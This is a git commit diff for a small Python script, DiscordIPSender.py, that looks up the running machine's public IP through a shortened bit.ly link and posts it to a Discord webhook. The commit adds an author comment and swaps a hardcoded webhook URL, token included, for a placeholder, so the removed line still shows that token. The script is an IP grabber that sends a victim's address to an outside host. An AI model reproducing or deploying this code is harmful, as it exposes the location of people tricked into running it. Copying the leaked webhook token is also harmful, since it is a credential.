02e19f008404e353600f5e4bf0ad7eb19bd0ec5d
qti <84819214+qu3tiiii@users.noreply.github.com>
2021-10-06 16:42:37 -0300

    Update DiscordIPSender.py

--- DiscordIPSender.py
+++ DiscordIPSender.py
@@ -1,7 +1,9 @@
+#By Qu3ti
 from urllib.request import Request, urlopen
 import requests
 ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
-webhook = 'https://discordapp.com/api/webhooks/895394297174716466/0mWHoD46ULpU_fmeN4c975lo2LmE0ijB9fgxftlZxL16kwxYEvNvoozlXo1SoAO_9ytw'
+#Webhook
+webhook = 'Webhook'
 message = (f'IP: ||{ip}||')
 data = {
 	    'content': message
